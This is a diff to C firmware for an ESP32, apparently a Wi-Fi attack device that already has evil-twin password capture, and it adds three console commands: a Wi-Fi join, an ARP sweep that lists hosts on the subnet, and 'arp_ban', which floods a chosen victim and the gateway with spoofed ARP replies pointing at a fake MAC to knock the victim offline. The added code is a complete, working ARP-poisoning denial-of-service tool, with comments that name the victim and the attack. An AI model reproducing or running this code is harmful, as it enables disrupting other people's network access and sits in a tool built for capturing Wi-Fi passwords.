@@ -56,6 +56,12 @@
 #include "lwip/netdb.h"
 #include "lwip/dns.h"
 #include "lwip/dhcp.h"
+#include "lwip/etharp.h"
+#include "lwip/netif.h"
+#include "lwip/ip4_addr.h"
+#include "lwip/prot/ethernet.h"
+#include "lwip/pbuf.h"
+#include "esp_netif_net_stack.h"
 
 #include "attack_handshake.h"
 #include "hccapx_serializer.h"
@@ -202,6 +208,17 @@ static volatile bool gps_raw_active = false;
 
 // Global stop flag for all operations
 static volatile bool operation_stop_requested = false;
+
+// wifi_connect command state: 0 = pending, 1 = success, -1 = failed
+static volatile int wifi_connect_result = 0;
+
+// ARP ban state
+static volatile bool arp_ban_active = false;
+static TaskHandle_t arp_ban_task_handle = NULL;
+static uint8_t arp_ban_target_mac[6];
+static ip4_addr_t arp_ban_target_ip;
+static uint8_t arp_ban_gateway_mac[6];
+static ip4_addr_t arp_ban_gateway_ip;
 
 // Sniffer state (allocated in PSRAM)
 static sniffer_ap_t *sniffer_aps = NULL;                    // ~75 KB in PSRAM
@@ -863,6 +880,10 @@ static int cmd_select_html(int argc, char **argv);
 static int cmd_show_pass(int argc, char **argv);
 static int cmd_file_delete(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
+static int cmd_wifi_connect(int argc, char **argv);
+static int cmd_list_hosts(int argc, char **argv);
+static int cmd_arp_ban(int argc, char **argv);
+static void arp_ban_task(void *pvParameters);
 static int cmd_reboot(int argc, char **argv);
 static int cmd_led(int argc, char **argv);
 static int cmd_vendor(int argc, char **argv);
@@ -1034,7 +1055,15 @@ static void wifi_event_handler(void *event_handler_arg,
             ESP_LOGD(TAG, "Wi-Fi: connected to SSID='%s', channel=%d, bssid=%02X:%02X:%02X:%02X:%02X:%02X",
                      (const char*)e->ssid, e->channel,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
-            MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+            
+            if (evilTwinSSID != NULL && evilTwinPassword != NULL) {
+                MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+            } else {
+                MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s'", (const char*)e->ssid);
+            }
+            
+            // Signal wifi_connect command that connection succeeded
+            wifi_connect_result = 1;
             
             // Mark password as correct
             last_password_wrong = false;
@@ -1223,6 +1252,12 @@ static void wifi_event_handler(void *event_handler_arg,
             const wifi_event_sta_disconnected_t *e = (const wifi_event_sta_disconnected_t *)event_data;
             ESP_LOGW(TAG, "Wi-Fi: connection to AP failed. SSID='%s', reason=%d",
                      (const char*)e->ssid, (int)e->reason);
+            
+            // Signal wifi_connect command that connection failed (only if waiting)
+            if (wifi_connect_result == 0) {
+                wifi_connect_result = -1;
+            }
+            
             if (applicationState == EVIL_TWIN_PASS_CHECK) {
                 ESP_LOGW(TAG, "Evil twin: connection failed, wrong password? Btw connectAttemptCount: %d", connectAttemptCount);
                 if (connectAttemptCount >= 3) {
@@ -3879,8 +3914,55 @@ static int cmd_stop(int argc, char **argv) {
         }
     }
     
+    // Stop ARP ban if active
+    if (arp_ban_active || arp_ban_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping ARP ban...");
+        arp_ban_active = false;
+        
+        // Wait for task to finish
+        for (int i = 0; i < 20 && arp_ban_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (arp_ban_task_handle != NULL) {
+            vTaskDelete(arp_ban_task_handle);
+            arp_ban_task_handle = NULL;
+            MY_LOG_INFO(TAG, "ARP ban task forcefully stopped.");
+        }
+    }
+    
     // Stop BLE scanner if running
     bt_scan_stop();
+    
+    // Disconnect from AP if connected via wifi_connect and reset WiFi
+    if (current_radio_mode == RADIO_MODE_WIFI && wifi_initialized) {
+        wifi_ap_record_t ap_info;
+        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
+            MY_LOG_INFO(TAG, "Disconnecting from AP '%s'...", ap_info.ssid);
+            esp_wifi_disconnect();
+        }
+        
+        // Reset WiFi to clean state
+        MY_LOG_INFO(TAG, "Resetting WiFi...");
+        esp_wifi_stop();
+        esp_wifi_deinit();
+        
+        // Destroy AP netif if exists
+        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+        if (ap_netif) {
+            esp_netif_destroy(ap_netif);
+        }
+        ap_netif_handle = NULL;
+        
+        wifi_initialized = false;
+        current_radio_mode = RADIO_MODE_NONE;
+        
+        // Reinitialize WiFi fresh (STA mode)
+        if (!ensure_wifi_mode()) {
+            MY_LOG_INFO(TAG, "Warning: Failed to reinitialize WiFi after stop");
+        }
+    }
     
     // Restore LED to idle (ignore errors if LED is in invalid state)
     esp_err_t led_err = led_set_idle();
@@ -3889,6 +3971,422 @@ static int cmd_stop(int argc, char **argv) {
     }
     
     MY_LOG_INFO(TAG, "All operations stopped.");
+    return 0;
+}
+
+static int cmd_wifi_connect(int argc, char **argv) {
+    if (argc < 3) {
+        MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> <Password>");
+        return 1;
+    }
+    
+    const char *ssid = argv[1];
+    const char *password = argv[2];
+    
+    MY_LOG_INFO(TAG, "Connecting to AP '%s'...", ssid);
+    
+    // Reset WiFi (same as mode switching)
+    esp_wifi_disconnect();
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    
+    // Destroy AP netif if exists
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (ap_netif) {
+        esp_netif_destroy(ap_netif);
+    }
+    ap_netif_handle = NULL;
+    
+    wifi_initialized = false;
+    current_radio_mode = RADIO_MODE_NONE;
+    
+    // Reinitialize WiFi
+    if (!ensure_wifi_mode()) {
+        MY_LOG_INFO(TAG, "Failed to reinitialize WiFi");
+        return 1;
+    }
+    
+    // Configure STA and connect
+    wifi_config_t sta_config = { 0 };
+    strncpy((char *)sta_config.sta.ssid, ssid, sizeof(sta_config.sta.ssid) - 1);
+    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password) - 1);
+    
+    esp_wifi_set_config(WIFI_IF_STA, &sta_config);
+    
+    // Reset result flag before connecting
+    wifi_connect_result = 0;
+    esp_wifi_connect();
+    
+    MY_LOG_INFO(TAG, "Waiting for connection result...");
+    
+    // Wait for connection result (max 15 seconds)
+    for (int i = 0; i < 150 && wifi_connect_result == 0; i++) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    if (wifi_connect_result == 1) {
+        MY_LOG_INFO(TAG, "SUCCESS: Connected to '%s'", ssid);
+        return 0;
+    } else if (wifi_connect_result == -1) {
+        MY_LOG_INFO(TAG, "FAILED: Could not connect to '%s' (wrong password or AP not found)", ssid);
+        return 1;
+    } else {
+        MY_LOG_INFO(TAG, "TIMEOUT: Connection to '%s' timed out", ssid);
+        return 1;
+    }
+}
+
+static int cmd_list_hosts(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    // Check if connected to AP
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
+        return 1;
+    }
+    
+    // Get STA netif
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        MY_LOG_INFO(TAG, "STA interface not found");
+        return 1;
+    }
+    
+    // Get IP info
+    esp_netif_ip_info_t ip_info;
+    if (esp_netif_get_ip_info(sta_netif, &ip_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to get IP info. DHCP may not have completed.");
+        return 1;
+    }
+    
+    if (ip_info.ip.addr == 0) {
+        MY_LOG_INFO(TAG, "No IP address assigned yet. Wait for DHCP.");
+        return 1;
+    }
+    
+    // Calculate host range from subnet
+    uint32_t ip = ntohl(ip_info.ip.addr);
+    uint32_t mask = ntohl(ip_info.netmask.addr);
+    uint32_t network = ip & mask;
+    uint32_t broadcast = network | ~mask;
+    uint32_t host_count_to_scan = broadcast - network - 1;
+    
+    MY_LOG_INFO(TAG, "Our IP: " IPSTR ", Netmask: " IPSTR, IP2STR(&ip_info.ip), IP2STR(&ip_info.netmask));
+    MY_LOG_INFO(TAG, "Scanning %lu hosts on network...", (unsigned long)host_count_to_scan);
+    
+    // Get LwIP netif from esp_netif
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_netif) {
+        MY_LOG_INFO(TAG, "Failed to get LwIP netif");
+        return 1;
+    }
+    
+    // Send ARP requests to all IPs in subnet
+    int requests_sent = 0;
+    for (uint32_t target = network + 1; target < broadcast && requests_sent < 254; target++) {
+        ip4_addr_t target_ip;
+        target_ip.addr = htonl(target);
+        etharp_request(lwip_netif, &target_ip);
+        requests_sent++;
+        
+        // Small delay between requests to avoid flooding
+        if (requests_sent % 10 == 0) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Sent %d ARP requests, waiting for responses...", requests_sent);
+    
+    // Wait for ARP responses
+    vTaskDelay(pdMS_TO_TICKS(3000));
+    
+    // Read and display ARP table
+    MY_LOG_INFO(TAG, "=== Discovered Hosts ===");
+    int found_count = 0;
+    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+        ip4_addr_t *ip_ret;
+        struct netif *netif_ret;
+        struct eth_addr *eth_ret;
+        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+            MY_LOG_INFO(TAG, "  %d.%d.%d.%d  ->  %02X:%02X:%02X:%02X:%02X:%02X",
+                ip4_addr1(ip_ret), ip4_addr2(ip_ret), ip4_addr3(ip_ret), ip4_addr4(ip_ret),
+                eth_ret->addr[0], eth_ret->addr[1], eth_ret->addr[2],
+                eth_ret->addr[3], eth_ret->addr[4], eth_ret->addr[5]);
+            found_count++;
+        }
+    }
+    MY_LOG_INFO(TAG, "========================");
+    MY_LOG_INFO(TAG, "Found %d hosts", found_count);
+    
+    return 0;
+}
+
+// Helper to parse MAC address from string "AA:BB:CC:DD:EE:FF"
+static bool parse_mac_address(const char *str, uint8_t *mac) {
+    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
+}
+
+// ARP packet structure (Ethernet + ARP)
+#define ARP_PACKET_SIZE 42  // 14 (Eth header) + 28 (ARP header)
+#define ETH_TYPE_ARP 0x0806
+#define ARP_HWTYPE_ETH 1
+#define ARP_PROTO_IP 0x0800
+#define ARP_OP_REPLY 2
+
+// Helper to build and send ARP reply packet
+static void send_arp_reply(struct netif *lwip_netif, 
+                           const uint8_t *dst_mac,      // Ethernet destination
+                           const uint8_t *src_mac,      // Ethernet source (fake)
+                           const uint8_t *sender_mac,   // ARP sender MAC (fake)
+                           uint32_t sender_ip,          // ARP sender IP (spoofed)
+                           const uint8_t *target_mac,   // ARP target MAC
+                           uint32_t target_ip) {        // ARP target IP
+    
+    uint8_t arp_packet[ARP_PACKET_SIZE];
+    
+    // Ethernet header (14 bytes)
+    memcpy(&arp_packet[0], dst_mac, 6);              // Destination MAC
+    memcpy(&arp_packet[6], src_mac, 6);              // Source MAC (fake)
+    arp_packet[12] = (ETH_TYPE_ARP >> 8) & 0xFF;     // EtherType ARP (0x0806)
+    arp_packet[13] = ETH_TYPE_ARP & 0xFF;
+    
+    // ARP header (28 bytes)
+    arp_packet[14] = (ARP_HWTYPE_ETH >> 8) & 0xFF;   // Hardware type: Ethernet (1)
+    arp_packet[15] = ARP_HWTYPE_ETH & 0xFF;
+    arp_packet[16] = (ARP_PROTO_IP >> 8) & 0xFF;     // Protocol type: IPv4 (0x0800)
+    arp_packet[17] = ARP_PROTO_IP & 0xFF;
+    arp_packet[18] = 6;                               // Hardware address length
+    arp_packet[19] = 4;                               // Protocol address length
+    arp_packet[20] = (ARP_OP_REPLY >> 8) & 0xFF;     // Operation: ARP Reply (2)
+    arp_packet[21] = ARP_OP_REPLY & 0xFF;
+    
+    // Sender hardware address (fake MAC)
+    memcpy(&arp_packet[22], sender_mac, 6);
+    
+    // Sender protocol address (spoofed IP)
+    arp_packet[28] = sender_ip & 0xFF;
+    arp_packet[29] = (sender_ip >> 8) & 0xFF;
+    arp_packet[30] = (sender_ip >> 16) & 0xFF;
+    arp_packet[31] = (sender_ip >> 24) & 0xFF;
+    
+    // Target hardware address
+    memcpy(&arp_packet[32], target_mac, 6);
+    
+    // Target protocol address
+    arp_packet[38] = target_ip & 0xFF;
+    arp_packet[39] = (target_ip >> 8) & 0xFF;
+    arp_packet[40] = (target_ip >> 16) & 0xFF;
+    arp_packet[41] = (target_ip >> 24) & 0xFF;
+    
+    // Allocate pbuf and send
+    struct pbuf *p = pbuf_alloc(PBUF_RAW, ARP_PACKET_SIZE, PBUF_RAM);
+    if (p != NULL) {
+        memcpy(p->payload, arp_packet, ARP_PACKET_SIZE);
+        lwip_netif->linkoutput(lwip_netif, p);
+        pbuf_free(p);
+    }
+}
+
+static void arp_ban_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    // Get netif
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        MY_LOG_INFO(TAG, "ARP ban: STA netif not found");
+        arp_ban_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_netif) {
+        MY_LOG_INFO(TAG, "ARP ban: LwIP netif not found");
+        arp_ban_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    if (!lwip_netif->linkoutput) {
+        MY_LOG_INFO(TAG, "ARP ban: netif has no linkoutput function");
+        arp_ban_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Fake MAC (non-existent address to break connectivity)
+    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
+    
+    MY_LOG_INFO(TAG, "ARP ban: Poisoning both victim and router");
+    
+    while (arp_ban_active) {
+        // Packet 1: To VICTIM - "Gateway IP is at fake MAC"
+        // Victim will try to send packets to gateway via fake MAC -> nowhere
+        send_arp_reply(lwip_netif,
+                       arp_ban_target_mac,       // Eth dst: victim
+                       fake_mac,                  // Eth src: fake
+                       fake_mac,                  // ARP sender MAC: fake
+                       arp_ban_gateway_ip.addr,   // ARP sender IP: gateway (spoofed!)
+                       arp_ban_target_mac,        // ARP target MAC: victim
+                       arp_ban_target_ip.addr);   // ARP target IP: victim
+        
+        vTaskDelay(pdMS_TO_TICKS(50));  // Small delay between packets
+        
+        // Packet 2: To ROUTER - "Victim IP is at fake MAC"
+        // Router will try to send packets to victim via fake MAC -> nowhere
+        send_arp_reply(lwip_netif,
+                       arp_ban_gateway_mac,       // Eth dst: router
+                       fake_mac,                  // Eth src: fake
+                       fake_mac,                  // ARP sender MAC: fake
+                       arp_ban_target_ip.addr,    // ARP sender IP: victim (spoofed!)
+                       arp_ban_gateway_mac,       // ARP target MAC: router
+                       arp_ban_gateway_ip.addr);  // ARP target IP: router
+        
+        vTaskDelay(pdMS_TO_TICKS(450)); // Total ~500ms cycle
+    }
+    
+    MY_LOG_INFO(TAG, "ARP ban task stopped");
+    arp_ban_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static int cmd_arp_ban(int argc, char **argv) {
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: arp_ban <MAC> [IP]");
+        MY_LOG_INFO(TAG, "Example: arp_ban AA:BB:CC:DD:EE:FF 192.168.1.50");
+        MY_LOG_INFO(TAG, "If IP is omitted, it will be looked up from ARP table.");
+        return 1;
+    }
+    
+    // Check if already running
+    if (arp_ban_active || arp_ban_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "ARP ban already running. Use 'stop' first.");
+        return 1;
+    }
+    
+    // Check if connected to AP
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
+        return 1;
+    }
+    
+    // Parse MAC address
+    if (!parse_mac_address(argv[1], arp_ban_target_mac)) {
+        MY_LOG_INFO(TAG, "Invalid MAC format. Use AA:BB:CC:DD:EE:FF");
+        return 1;
+    }
+    
+    // Parse optional IP or try to find it in ARP table
+    if (argc >= 3) {
+        uint32_t ip = esp_ip4addr_aton(argv[2]);
+        if (ip == 0) {
+            MY_LOG_INFO(TAG, "Invalid IP address: %s", argv[2]);
+            return 1;
+        }
+        arp_ban_target_ip.addr = ip;
+    } else {
+        // Try to find IP from ARP table
+        bool found = false;
+        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+            ip4_addr_t *ip_ret;
+            struct netif *netif_ret;
+            struct eth_addr *eth_ret;
+            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+                if (memcmp(eth_ret->addr, arp_ban_target_mac, 6) == 0) {
+                    arp_ban_target_ip.addr = ip_ret->addr;
+                    found = true;
+                    MY_LOG_INFO(TAG, "Found IP %d.%d.%d.%d for target MAC",
+                               ip4_addr1(ip_ret), ip4_addr2(ip_ret), 
+                               ip4_addr3(ip_ret), ip4_addr4(ip_ret));
+                    break;
+                }
+            }
+        }
+        if (!found) {
+            MY_LOG_INFO(TAG, "MAC not found in ARP table. Run 'list_hosts' first or specify IP.");
+            return 1;
+        }
+    }
+    
+    // Get gateway info
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    esp_netif_ip_info_t ip_info;
+    esp_netif_get_ip_info(sta_netif, &ip_info);
+    
+    // Store gateway IP
+    arp_ban_gateway_ip.addr = ip_info.gw.addr;
+    
+    // Find gateway MAC from ARP table
+    bool gateway_found = false;
+    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+        ip4_addr_t *ip_ret;
+        struct netif *netif_ret;
+        struct eth_addr *eth_ret;
+        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+            if (ip_ret->addr == ip_info.gw.addr) {
+                memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
+                gateway_found = true;
+                break;
+            }
+        }
+    }
+    
+    if (!gateway_found) {
+        // Gateway not in ARP table - send ARP request to get it
+        MY_LOG_INFO(TAG, "Gateway MAC not in ARP table, sending ARP request...");
+        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
+        if (lwip_netif) {
+            ip4_addr_t gw_ip = { .addr = ip_info.gw.addr };
+            etharp_request(lwip_netif, &gw_ip);
+            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for response
+            
+            // Try again
+            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+                ip4_addr_t *ip_ret;
+                struct netif *netif_ret;
+                struct eth_addr *eth_ret;
+                if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
+                    if (ip_ret->addr == ip_info.gw.addr) {
+                        memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
+                        gateway_found = true;
+                        break;
+                    }
+                }
+            }
+        }
+        
+        if (!gateway_found) {
+            MY_LOG_INFO(TAG, "Could not find gateway MAC. Make sure you're connected to the network.");
+            return 1;
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Starting ARP ban attack (bidirectional):");
+    MY_LOG_INFO(TAG, "  Target MAC: %02X:%02X:%02X:%02X:%02X:%02X",
+               arp_ban_target_mac[0], arp_ban_target_mac[1], arp_ban_target_mac[2],
+               arp_ban_target_mac[3], arp_ban_target_mac[4], arp_ban_target_mac[5]);
+    MY_LOG_INFO(TAG, "  Target IP: %d.%d.%d.%d",
+               ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
+               ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
+    MY_LOG_INFO(TAG, "  Gateway MAC: %02X:%02X:%02X:%02X:%02X:%02X",
+               arp_ban_gateway_mac[0], arp_ban_gateway_mac[1], arp_ban_gateway_mac[2],
+               arp_ban_gateway_mac[3], arp_ban_gateway_mac[4], arp_ban_gateway_mac[5]);
+    MY_LOG_INFO(TAG, "  Gateway IP: " IPSTR, IP2STR(&ip_info.gw));
+    MY_LOG_INFO(TAG, "  Attack: Poisoning BOTH victim and router");
+    
+    // Start attack task
+    arp_ban_active = true;
+    BaseType_t result = xTaskCreate(arp_ban_task, "arp_ban", 4096, NULL, 5, &arp_ban_task_handle);
+    if (result != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create ARP ban task");
+        arp_ban_active = false;
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "ARP ban started. Use 'stop' to stop.");
     return 0;
 }
 
@@ -7975,6 +8473,33 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&stop_cmd));
+
+    const esp_console_cmd_t wifi_connect_cmd = {
+        .command = "wifi_connect",
+        .help = "Connect to AP as STA: wifi_connect <SSID> <Password>",
+        .hint = "<SSID> <Password>",
+        .func = &cmd_wifi_connect,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&wifi_connect_cmd));
+
+    const esp_console_cmd_t list_hosts_cmd = {
+        .command = "list_hosts",
+        .help = "Scan local network via ARP and list discovered hosts",
+        .hint = NULL,
+        .func = &cmd_list_hosts,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&list_hosts_cmd));
+
+    const esp_console_cmd_t arp_ban_cmd = {
+        .command = "arp_ban",
+        .help = "ARP poison a device to disconnect it: arp_ban <MAC> [IP]",
+        .hint = "<MAC> [IP]",
+        .func = &cmd_arp_ban,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&arp_ban_cmd));
 
     const esp_console_cmd_t reboot_cmd = {
         .command = "reboot",
